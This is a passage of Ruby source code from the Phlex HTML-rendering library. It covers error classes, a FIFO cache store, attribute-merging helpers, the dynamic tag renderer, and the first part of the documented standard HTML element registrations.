--------------------------------------------------------------------------------
1 | # frozen_string_literal: true
2 |
3 | # @api private
4 | module Phlex::Error
5 | end
6 |


--------------------------------------------------------------------------------
/lib/phlex/errors/argument_error.rb:
--------------------------------------------------------------------------------
1 | # frozen_string_literal: true
2 |
3 | class Phlex::ArgumentError < ArgumentError
4 | 	include Phlex::Error
5 | end
6 |


--------------------------------------------------------------------------------
/lib/phlex/errors/double_render_error.rb:
--------------------------------------------------------------------------------
1 | # frozen_string_literal: true
2 |
3 | class Phlex::DoubleRenderError < RuntimeError
4 | 	include Phlex::Error
5 | end
6 |


--------------------------------------------------------------------------------
/lib/phlex/errors/name_error.rb:
--------------------------------------------------------------------------------
1 | # frozen_string_literal: true
2 |
3 | class Phlex::NameError < NameError
4 | 	include Phlex::Error
5 | end
6 |


--------------------------------------------------------------------------------
/lib/phlex/errors/runtime_error.rb:
--------------------------------------------------------------------------------
1 | # frozen_string_literal: true
2 |
3 | class Phlex::RuntimeError < RuntimeError
4 | 	include Phlex::Error
5 | end
6 |


--------------------------------------------------------------------------------
/lib/phlex/fifo.rb:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | # @api private
 4 | class Phlex::FIFO
 5 | 	def initialize(max_bytesize: 2_000, max_value_bytesize: 2_000)
 6 | 		@store = {}
 7 | 		@max_bytesize = max_bytesize
 8 | 		@max_value_bytesize = max_value_bytesize
 9 | 		@bytesize = 0
10 | 		@mutex = Monitor.new
11 | 	end
12 |
13 | 	attr_reader :bytesize, :max_bytesize
14 |
15 | 	def expand(bytes)
16 | 		@mutex.synchronize do
17 | 			@max_bytesize += bytes
18 | 		end
19 | 	end
20 |
21 | 	def [](key)
22 | 		k, v = @store[key.hash]
23 | 		v if k.eql?(key)
24 | 	end
25 |
26 | 	def []=(key, value)
27 | 		return if value.bytesize > @max_value_bytesize
28 |
29 | 		digest = key.hash
30 |
31 | 		@mutex.synchronize do
32 | 			# Check the key definitely doesn't exist now we have the lock
33 | 			return if @store[digest]
34 |
35 | 			@store[digest] = [key, value].freeze
36 | 			@bytesize += value.bytesize
37 |
38 | 			while @bytesize > @max_bytesize
39 | 				k, v = @store.shift
40 | 				@bytesize -= v[1].bytesize
41 | 			end
42 | 		end
43 | 	end
44 |
45 | 	def size
46 | 		@store.size
47 | 	end
48 |
49 | 	def clear
50 | 		@mutex.synchronize do
51 | 			@store.clear
52 | 			@bytesize = 0
53 | 		end
54 | 	end
55 | end
56 |


--------------------------------------------------------------------------------
/lib/phlex/fifo_cache_store.rb:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | # An extremely fast in-memory cache store that evicts keys on a first-in-first-out basis.
 4 | class Phlex::FIFOCacheStore
 5 | 	def initialize(max_bytesize: 2 ** 20)
 6 | 		@fifo = Phlex::FIFO.new(
 7 | 			max_bytesize:,
 8 | 			max_value_bytesize: max_bytesize
 9 | 		)
10 | 	end
11 |
12 | 	def fetch(key)
13 | 		fifo = @fifo
14 | 		key = map_key(key)
15 |
16 | 		if (result = fifo[key])
17 | 			JSON.parse(result)
18 | 		else
19 | 			result = yield
20 |
21 | 			fifo[key] = JSON.fast_generate(result)
22 |
23 | 			result
24 | 		end
25 | 	end
26 |
27 | 	def clear
28 | 		@fifo.clear
29 | 	end
30 |
31 | 	private def map_key(value)
32 | 		case value
33 | 		when Array
34 | 			value.map { |it| map_key(it) }
35 | 		when Hash
36 | 			value.to_h { |k, v| [map_key(k), map_key(v)].freeze }
37 | 		when String, Symbol, Integer, Float, Time, true, false, nil
38 | 			value
39 | 		else
40 | 			if value.respond_to?(:cache_key_with_version)
41 | 				map_key(value.cache_key_with_version)
42 | 			elsif value.respond_to?(:cache_key)
43 | 				map_key(value.cache_key)
44 | 			else
45 | 				raise ArgumentError.new("Invalid cache key: #{value.class}")
46 | 			end
47 | 		end
48 | 	end
49 | end
50 |


--------------------------------------------------------------------------------
/lib/phlex/helpers.rb:
--------------------------------------------------------------------------------
 1 | # frozen_string_literal: true
 2 |
 3 | # @api private
 4 | module Phlex::Helpers
 5 | 	private def mix(*args)
 6 | 		args.each_with_object({}) do |object, result|
 7 | 			result.merge!(object) do |_key, old, new|
 8 | 				case [old, new].freeze
 9 | 				in [Array, Array] | [Set, Set]
10 | 					old + new
11 | 				in [Array, Set]
12 | 					old + new.to_a
13 | 				in [Array, String]
14 | 					old + [new]
15 | 				in [Hash, Hash]
16 | 					mix(old, new)
17 | 				in [Set, Array]
18 | 					old.to_a + new
19 | 				in [Set, String]
20 | 					old.to_a + [new]
21 | 				in [String, Array]
22 | 					[old] + new
23 | 				in [String, Set]
24 | 					[old] + new.to_a
25 | 				in [String, String]
26 | 					"#{old} #{new}"
27 | 				in [_, Hash]
28 | 					{ _: old, **new }
29 | 				in [Hash, _]
30 | 					{ **old, _: new }
31 | 				in [_, nil]
32 | 					old
33 | 				else
34 | 					new
35 | 				end
36 | 			end
37 |
38 | 			result.transform_keys! do |key|
39 | 				key.end_with?("!") ? key.name.chop.to_sym : key
40 | 			end
41 | 		end
42 | 	end
43 |
44 | 	private def grab(**bindings)
45 | 		if bindings.size > 1
46 | 			bindings.values
47 | 		else
48 | 			bindings.values.first
49 | 		end
50 | 	end
51 | end
52 |


--------------------------------------------------------------------------------
/lib/phlex/html.rb:
--------------------------------------------------------------------------------
  1 | # frozen_string_literal: true
  2 |
  3 | class Phlex::HTML < Phlex::SGML
  4 | 	extend Phlex::SGML::Elements
  5 | 	include VoidElements, StandardElements
  6 |
  7 | 	# Output an HTML doctype.
  8 | 	def doctype
  9 | 		state = @_state
 10 | 		return unless state.should_render?
 11 |
 12 | 		state.buffer << "<!doctype html>"
 13 | 		nil
 14 | 	end
 15 |
 16 | 	# Outputs an `<svg>` tag.
 17 | 	#
 18 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/SVG/Element/svg)
 19 | 	# [Spec](https://html.spec.whatwg.org/#the-svg-element)
 20 | 	def svg(*, **, &)
 21 | 		if block_given?
 22 | 			super { render Phlex::SVG.new(&) }
 23 | 		else
 24 | 			super
 25 | 		end
 26 | 	end
 27 |
 28 | 	# Override to provide a filename for the HTML file
 29 | 	def filename
 30 | 		nil
 31 | 	end
 32 |
 33 | 	# Returns the string "text/html"
 34 | 	def content_type
 35 | 		"text/html"
 36 | 	end
 37 |
 38 | 	# Output an HTML tag dynamically, e.g:
 39 | 	#
 40 | 	# ```ruby
 41 | 	# @tag_name = :h1
 42 | 	# tag(@tag_name, class: "title")
 43 | 	# ```
 44 | 	def tag(name, **attributes, &)
 45 | 		state = @_state
 46 | 		block_given = block_given?
 47 | 		buffer = state.buffer
 48 |
 49 | 		unless state.should_render?
 50 | 			yield(self) if block_given
 51 | 			return nil
 52 | 		end
 53 |
 54 | 		unless Symbol === name
 55 | 			raise Phlex::ArgumentError.new("Expected the tag name to be a Symbol.")
 56 | 		end
 57 |
 58 | 		if (tag = StandardElements.__registered_elements__[name]) || (tag = name.name.tr("_", "-")).include?("-")
 59 | 			if attributes.length > 0 # with attributes
 60 | 				if block_given # with content block
 61 | 					buffer << "<#{tag}" << (Phlex::ATTRIBUTE_CACHE[attributes] ||= __attributes__(attributes)) << ">"
 62 | 					if tag == "svg"
 63 | 						render Phlex::SVG.new(&)
 64 | 					else
 65 | 						__yield_content__(&)
 66 | 					end
 67 | 					buffer << "</#{tag}>"
 68 | 				else # without content
 69 | 					buffer << "<#{tag}" << (::Phlex::ATTRIBUTE_CACHE[attributes] ||= __attributes__(attributes)) << "></#{tag}>"
 70 | 				end
 71 | 			else # without attributes
 72 | 				if block_given # with content block
 73 | 					buffer << ("<#{tag}>")
 74 | 					if tag == "svg"
 75 | 						render Phlex::SVG.new(&)
 76 | 					else
 77 | 						__yield_content__(&)
 78 | 					end
 79 | 					buffer << "</#{tag}>"
 80 | 				else # without content
 81 | 					buffer << "<#{tag}></#{tag}>"
 82 | 				end
 83 | 			end
 84 | 		elsif (tag = VoidElements.__registered_elements__[name])
 85 | 			if block_given
 86 | 				raise Phlex::ArgumentError.new("Void elements cannot have content blocks.")
 87 | 			end
 88 |
 89 | 			if attributes.length > 0 # with attributes
 90 | 				buffer << "<#{tag}" << (::Phlex::ATTRIBUTE_CACHE[attributes] ||= __attributes__(attributes)) << ">"
 91 | 			else # without attributes
 92 | 				buffer << "<#{tag}>"
 93 | 			end
 94 |
 95 | 			nil
 96 | 		else
 97 | 			raise Phlex::ArgumentError.new("Invalid HTML tag: #{name}")
 98 | 		end
 99 | 	end
100 | end
101 |


--------------------------------------------------------------------------------
/lib/phlex/html/standard_elements.rb:
--------------------------------------------------------------------------------
  1 | # frozen_string_literal: true
  2 |
  3 | # Standard HTML elements accept content and always have a closing tag.
  4 | module Phlex::HTML::StandardElements
  5 | 	extend Phlex::SGML::Elements
  6 |
  7 | 	# Outputs an `<a>` tag.
  8 | 	#
  9 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/a)
 10 | 	# [Spec](https://html.spec.whatwg.org/#the-a-element)
 11 | 	register_element def a(**attributes, &content) = nil
 12 |
 13 | 	# Outputs an `<abbr>` tag.
 14 | 	#
 15 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/abbr)
 16 | 	# [Spec](https://html.spec.whatwg.org/#the-abbr-element)
 17 | 	register_element def abbr(**attributes, &content) = nil
 18 |
 19 | 	# Outputs an `<address>` tag.
 20 | 	#
 21 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/address)
 22 | 	# [Spec](https://html.spec.whatwg.org/#the-address-element)
 23 | 	register_element def address(**attributes, &content) = nil
 24 |
 25 | 	# Outputs an `<article>` tag.
 26 | 	#
 27 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/article)
 28 | 	# [Spec](https://html.spec.whatwg.org/#the-article-element)
 29 | 	register_element def article(**attributes, &content) = nil
 30 |
 31 | 	# Outputs an `<aside>` tag.
 32 | 	#
 33 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/aside)
 34 | 	# [Spec](https://html.spec.whatwg.org/#the-aside-element)
 35 | 	register_element def aside(**attributes, &content) = nil
 36 |
 37 | 	# Outputs an `<audio>` tag.
 38 | 	#
 39 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/audio)
 40 | 	# [Spec](https://html.spec.whatwg.org/#the-audio-element)
 41 | 	# [Can I Use?](https://caniuse.com/audio)
 42 | 	register_element def audio(**attributes, &content) = nil
 43 |
 44 | 	# Outputs a `<b>` tag.
 45 | 	#
 46 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/b)
 47 | 	# [Spec](https://html.spec.whatwg.org/#the-b-element)
 48 | 	register_element def b(**attributes, &content) = nil
 49 |
 50 | 	# Outputs a `<bdi>` tag.
 51 | 	#
 52 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/bdi)
 53 | 	# [Spec](https://html.spec.whatwg.org/#the-bdi-element)
 54 | 	register_element def bdi(**attributes, &content) = nil
 55 |
 56 | 	# Outputs a `<bdo>` tag.
 57 | 	#
 58 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/bdo)
 59 | 	# [Spec](https://html.spec.whatwg.org/#the-bdo-element)
 60 | 	register_element def bdo(**attributes, &content) = nil
 61 |
 62 | 	# Outputs a `<blockquote>` tag.
 63 | 	#
 64 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/blockquote)
 65 | 	# [Spec](https://html.spec.whatwg.org/#the-blockquote-element)
 66 | 	register_element def blockquote(**attributes, &content) = nil
 67 |
 68 | 	# Outputs a `<body>` tag.
 69 | 	#
 70 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/body)
 71 | 	# [Spec](https://html.spec.whatwg.org/#the-body-element)
 72 | 	register_element def body(**attributes, &content) = nil
 73 |
 74 | 	# Outputs a `<button>` tag.
 75 | 	# The `<button>` element is an interactive element activated by a user with a mouse, keyboard, finger, voice command, or other assistive technology to perform an action, such as submitting a form or opening a dialog.
 76 | 	#
 77 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/button)
 78 | 	# [Spec](https://html.spec.whatwg.org/#the-button-element)
 79 | 	register_element def button(**attributes, &content) = nil
 80 |
 81 | 	# Outputs a `<canvas>` tag.
 82 | 	#
 83 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/canvas)
 84 | 	# [Spec](https://html.spec.whatwg.org/#the-canvas-element)
 85 | 	register_element def canvas(**attributes, &content) = nil
 86 |
 87 | 	# Outputs a `<caption>` tag.
 88 | 	#
 89 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/caption)
 90 | 	# [Spec](https://html.spec.whatwg.org/#the-caption-element)
 91 | 	register_element def caption(**attributes, &content) = nil
 92 |
 93 | 	# Outputs a `<cite>` tag.
 94 | 	#
 95 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/cite)
 96 | 	# [Spec](https://html.spec.whatwg.org/#the-cite-element)
 97 | 	register_element def cite(**attributes, &content) = nil
 98 |
 99 | 	# Outputs a `<code>` tag.
100 | 	#
101 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/code)
102 | 	# [Spec](https://html.spec.whatwg.org/#the-code-element)
103 | 	register_element def code(**attributes, &content) = nil
104 |
105 | 	# Outputs a `<colgroup>` tag.
106 | 	#
107 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/colgroup)
108 | 	# [Spec](https://html.spec.whatwg.org/#the-colgroup-element)
109 | 	register_element def colgroup(**attributes, &content) = nil
110 |
111 | 	# Outputs a `<data>` tag.
112 | 	#
113 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/data)
114 | 	# [Spec](https://html.spec.whatwg.org/#the-data-element)
115 | 	register_element def data(**attributes, &content) = nil
116 |
117 | 	# Outputs a `<datalist>` tag.
118 | 	#
119 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/datalist)
120 | 	# [Spec](https://html.spec.whatwg.org/#the-datalist-element)
121 | 	register_element def datalist(**attributes, &content) = nil
122 |
123 | 	# Outputs a `<dd>` tag.
124 | 	#
125 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/dd)
126 | 	# [Spec](https://html.spec.whatwg.org/#the-dd-element)
127 | 	register_element def dd(**attributes, &content) = nil
128 |
129 | 	# Outputs a `<del>` tag.
130 | 	#
131 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/del)
132 | 	# [Spec](https://html.spec.whatwg.org/#the-del-element)
133 | 	register_element def del(**attributes, &content) = nil
134 |
135 | 	# Outputs a `<details>` tag.
136 | 	#
137 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/details)
138 | 	# [Spec](https://html.spec.whatwg.org/#the-details-element)
139 | 	# [Can I Use?](https://caniuse.com/details)
140 | 	register_element def details(**attributes, &content) = nil
141 |
142 | 	# Outputs a `<dfn>` tag.
143 | 	#
144 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/dfn)
145 | 	# [Spec](https://html.spec.whatwg.org/#the-dfn-element)
146 | 	register_element def dfn(**attributes, &content) = nil
147 |
148 | 	# Outputs a `<dialog>` tag.
149 | 	#
150 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/dialog)
151 | 	# [Spec](https://html.spec.whatwg.org/#the-dialog-element)
152 | 	# [Can I use?](https://caniuse.com/dialog)
153 | 	register_element def dialog(**attributes, &content) = nil
154 |
155 | 	# Outputs a `<div>` tag.
156 | 	#
157 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/div)
158 | 	# [Spec](https://html.spec.whatwg.org/#the-div-element)
159 | 	register_element def div(**attributes, &content) = nil
160 |
161 | 	# Outputs a `<dl>` tag.
162 | 	#
163 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/dl)
164 | 	# [Spec](https://html.spec.whatwg.org/#the-dl-element)
165 | 	register_element def dl(**attributes, &content) = nil
166 |
167 | 	# Outputs a `<dt>` tag.
168 | 	#
169 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/dt)
170 | 	# [Spec](https://html.spec.whatwg.org/#the-dt-element)
171 | 	register_element def dt(**attributes, &content) = nil
172 |
173 | 	# Outputs an `<em>` tag.
174 | 	#
175 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/em)
176 | 	# [Spec](https://html.spec.whatwg.org/#the-em-element)
177 | 	register_element def em(**attributes, &content) = nil
178 |
179 | 	# [EXPERIMENTAL] Outputs a `<fencedframe>` tag.
180 | 	#
181 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/fencedframe)
182 | 	# [Can I Use?](https://caniuse.com/mdn-html_elements_fencedframe)
183 | 	register_element def fencedframe(**attributes, &content) = nil
184 |
185 | 	# Outputs a `<fieldset>` tag.
186 | 	#
187 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/fieldset)
188 | 	# [Spec](https://html.spec.whatwg.org/#the-fieldset-element)
189 | 	register_element def fieldset(**attributes, &content) = nil
190 |
191 | 	# Outputs a `<figcaption>` tag.
192 | 	#
193 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/figcaption)
194 | 	# [Spec](https://html.spec.whatwg.org/#the-figcaption-element)
195 | 	register_element def figcaption(**attributes, &content) = nil
196 |
197 | 	# Outputs a `<figure>` tag.
198 | 	#
199 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/figure)
200 | 	# [Spec](https://html.spec.whatwg.org/#the-figure-element)
201 | 	register_element def figure(**attributes, &content) = nil
202 |
203 | 	# Outputs a `<footer>` tag.
204 | 	#
205 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/footer)
206 | 	# [Spec](https://html.spec.whatwg.org/#the-footer-element)
207 | 	register_element def footer(**attributes, &content) = nil
208 |
209 | 	# Outputs a `<form>` tag.
210 | 	#
211 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/form)
212 | 	# [Spec](https://html.spec.whatwg.org/#the-form-element)
213 | 	register_element def form(**attributes, &content) = nil
214 |
215 | 	# Outputs an `<h1>` tag.
216 | 	#
217 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/h1)
218 | 	# [Spec](https://html.spec.whatwg.org/#the-h1-element)
219 | 	register_element def h1(**attributes, &content) = nil
220 |
221 | 	# Outputs an `<h2>` tag.
222 | 	#
223 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/h2)
224 | 	# [Spec](https://html.spec.whatwg.org/#the-h2-element)
225 | 	register_element def h2(**attributes, &content) = nil
226 |
227 | 	# Outputs an `<h3>` tag.
228 | 	#
229 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/h3)
230 | 	# [Spec](https://html.spec.whatwg.org/#the-h3-element)
231 | 	register_element def h3(**attributes, &content) = nil
232 |
233 | 	# Outputs an `<h4>` tag.
234 | 	#
235 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/h4)
236 | 	# [Spec](https://html.spec.whatwg.org/#the-h4-element)
237 | 	register_element def h4(**attributes, &content) = nil
238 |
239 | 	# Outputs an `<h5>` tag.
240 | 	#
241 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/h5)
242 | 	# [Spec](https://html.spec.whatwg.org/#the-h5-element)
243 | 	register_element def h5(**attributes, &content) = nil
244 |
245 | 	# Outputs an `<h6>` tag.
246 | 	#
247 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/h6)
248 | 	# [Spec](https://html.spec.whatwg.org/#the-h6-element)
249 | 	register_element def h6(**attributes, &content) = nil
250 |
251 | 	# Outputs a `<head>` tag.
252 | 	#
253 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/head)
254 | 	# [Spec](https://html.spec.whatwg.org/#the-head-element)
255 | 	register_element def head(**attributes, &content) = nil
256 |
257 | 	# Outputs a `<header>` tag.
258 | 	#
259 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/header)
260 | 	# [Spec](https://html.spec.whatwg.org/#the-header-element)
261 | 	register_element def header(**attributes, &content) = nil
262 |
263 | 	# Outputs an `<hgroup>` tag.
264 | 	#
265 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/hgroup)
266 | 	# [Spec](https://html.spec.whatwg.org/#the-hgroup-element)
267 | 	register_element def hgroup(**attributes, &content) = nil
268 |
269 | 	# Outputs an `<html>` tag.
270 | 	#
271 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/html)
272 | 	# [Spec](https://html.spec.whatwg.org/#the-html-element)
273 | 	register_element def html(**attributes, &content) = nil
274 |
275 | 	# Outputs an `<i>` tag.
276 | 	#
277 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/i)
278 | 	# [Spec](https://html.spec.whatwg.org/#the-i-element)
279 | 	register_element def i(**attributes, &content) = nil
280 |
281 | 	# Outputs an `<iframe>` tag.
282 | 	#
283 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/iframe)
284 | 	# [Spec](https://html.spec.whatwg.org/#the-iframe-element)
285 | 	register_element def iframe(**attributes, &content) = nil
286 |
287 | 	# Outputs an `<ins>` tag.
288 | 	#
289 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/ins)
290 | 	# [Spec](https://html.spec.whatwg.org/#the-ins-element)
291 | 	register_element def ins(**attributes, &content) = nil
292 |
293 | 	# Outputs a `<kbd>` tag.
294 | 	#
295 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/kbd)
296 | 	# [Spec](https://html.spec.whatwg.org/#the-kbd-element)
297 | 	register_element def kbd(**attributes, &content) = nil
298 |
299 | 	# Outputs a `<label>` tag.
300 | 	#
301 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/label)
302 | 	# [Spec](https://html.spec.whatwg.org/#the-label-element)
303 | 	register_element def label(**attributes, &content) = nil
304 |
305 | 	# Outputs a `<legend>` tag.
306 | 	#
307 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/legend)
308 | 	# [Spec](https://html.spec.whatwg.org/#the-legend-element)
309 | 	register_element def legend(**attributes, &content) = nil
310 |
311 | 	# Outputs a `<li>` tag.
312 | 	#
313 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/li)
314 | 	# [Spec](https://html.spec.whatwg.org/#the-li-element)
315 | 	register_element def li(**attributes, &content) = nil
316 |
317 | 	# Outputs a `<main>` tag.
318 | 	#
319 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/main)
320 | 	# [Spec](https://html.spec.whatwg.org/#the-main-element)
321 | 	register_element def main(**attributes, &content) = nil
322 |
323 | 	# Outputs a `<map>` tag.
324 | 	#
325 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/map)
326 | 	# [Spec](https://html.spec.whatwg.org/#the-map-element)
327 | 	register_element def map(**attributes, &content) = nil
328 |
329 | 	# Outputs a `<mark>` tag.
330 | 	#
331 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/mark)
332 | 	# [Spec](https://html.spec.whatwg.org/#the-mark-element)
333 | 	register_element def mark(**attributes, &content) = nil
334 |
335 | 	# Outputs a `<menu>` tag.
336 | 	#
337 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/menu)
338 | 	# [Spec](https://html.spec.whatwg.org/#the-menu-element)
339 | 	register_element def menu(**attributes, &content) = nil
340 |
341 | 	# Outputs a `<meter>` tag.
342 | 	#
343 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/meter)
344 | 	# [Spec](https://html.spec.whatwg.org/#the-meter-element)
345 | 	register_element def meter(**attributes, &content) = nil
346 |
347 | 	# Outputs a `<nav>` tag.
348 | 	#
349 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/nav)
350 | 	# [Spec](https://html.spec.whatwg.org/#the-nav-element)
351 | 	register_element def nav(**attributes, &content) = nil
352 |
353 | 	# Outputs a `<noscript>` tag.
354 | 	#
355 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/noscript)
356 | 	# [Spec](https://html.spec.whatwg.org/#the-noscript-element)
357 | 	register_element def noscript(**attributes, &content) = nil
358 |
359 | 	# Outputs an `<object>` tag.
360 | 	#
361 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/object)
362 | 	# [Spec](https://html.spec.whatwg.org/#the-object-element)
363 | 	register_element def object(**attributes, &content) = nil
364 |
365 | 	# Outputs an `<ol>` tag.
366 | 	#
367 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/ol)
368 | 	# [Spec](https://html.spec.whatwg.org/#the-ol-element)
369 | 	register_element def ol(**attributes, &content) = nil
370 |
371 | 	# Outputs an `<optgroup>` tag.
372 | 	#
373 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/optgroup)
374 | 	# [Spec](https://html.spec.whatwg.org/#the-optgroup-element)
375 | 	register_element def optgroup(**attributes, &content) = nil
376 |
377 | 	# Outputs an `<option>` tag.
378 | 	#
379 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/option)
380 | 	# [Spec](https://html.spec.whatwg.org/#the-option-element)
381 | 	register_element def option(**attributes, &content) = nil
382 |
383 | 	# Outputs an `<output>` tag.
384 | 	#
385 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/output)
386 | 	# [Spec](https://html.spec.whatwg.org/#the-output-element)
387 | 	register_element def output(**attributes, &content) = nil
388 |
389 | 	# Outputs a `<p>` tag.
390 | 	#
391 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/p)
392 | 	# [Spec](https://html.spec.whatwg.org/#the-p-element)
393 | 	register_element def p(**attributes, &content) = nil
394 |
395 | 	# Outputs a `<picture>` tag.
396 | 	#
397 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/picture)
398 | 	# [Spec](https://html.spec.whatwg.org/#the-picture-element)
399 | 	# [Can I Use?](https://caniuse.com/picture)
400 | 	register_element def picture(**attributes, &content) = nil
401 |
402 | 	# Outputs a `<pre>` tag.
403 | 	#
404 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/pre)
405 | 	# [Spec](https://html.spec.whatwg.org/#the-pre-element)
406 | 	register_element def pre(**attributes, &content) = nil
407 |
408 | 	# Outputs a `<progress>` tag.
409 | 	#
410 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/progress)
411 | 	# [Spec](https://html.spec.whatwg.org/#the-progress-element)
412 | 	register_element def progress(**attributes, &content) = nil
413 |
414 | 	# Outputs a `<q>` tag.
415 | 	#
416 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/q)
417 | 	# [Spec](https://html.spec.whatwg.org/#the-q-element)
418 | 	register_element def q(**attributes, &content) = nil
419 |
420 | 	# Outputs an `<rp>` tag.
421 | 	#
422 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/rp)
423 | 	# [Spec](https://html.spec.whatwg.org/#the-rp-element)
424 | 	register_element def rp(**attributes, &content) = nil
425 |
426 | 	# Outputs an `<rt>` tag.
427 | 	#
428 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/rt)
429 | 	# [Spec](https://html.spec.whatwg.org/#the-rt-element)
430 | 	register_element def rt(**attributes, &content) = nil
431 |
432 | 	# Outputs a `<ruby>` tag. (The best tag ever!)
433 | 	#
434 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/ruby)
435 | 	# [Spec](https://html.spec.whatwg.org/#the-ruby-element)
436 | 	register_element def ruby(**attributes, &content) = nil
437 |
438 | 	# Outputs an `<s>` tag.
439 | 	#
440 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/s)
441 | 	# [Spec](https://html.spec.whatwg.org/#the-s-element)
442 | 	register_element def s(**attributes, &content) = nil
443 |
444 | 	# Outputs a `<samp>` tag.
445 | 	#
446 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/samp)
447 | 	# [Spec](https://html.spec.whatwg.org/#the-samp-element)
448 | 	register_element def samp(**attributes, &content) = nil
449 |
450 | 	# Outputs a `<script>` tag.
451 | 	#
452 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/script)
453 | 	# [Spec](https://html.spec.whatwg.org/#the-script-element)
454 | 	register_element def script(**attributes, &content) = nil
455 |
456 | 	# Outputs a `<search>` tag.
457 | 	#
458 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/search)
459 | 	# [Spec](https://html.spec.whatwg.org/#the-search-element)
460 | 	# [Can I Use?](https://caniuse.com/mdn-html_elements_search)
461 | 	register_element def search(**attributes, &content) = nil
462 |
463 | 	# Outputs a `<section>` tag.
464 | 	#
465 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/section)
466 | 	# [Spec](https://html.spec.whatwg.org/#the-section-element)
467 | 	register_element def section(**attributes, &content) = nil
468 |
469 | 	# Outputs a `<select>` tag.
470 | 	#
471 | 	# [MDN Docs](https://developer.mozilla.org/docs/Web/HTML/Element/select)
472 | 	# [Spec](https://html.spec.whatwg.org/#the-select-element)
473 | 	register_element def select(**attributes, &content) = nil
474 |
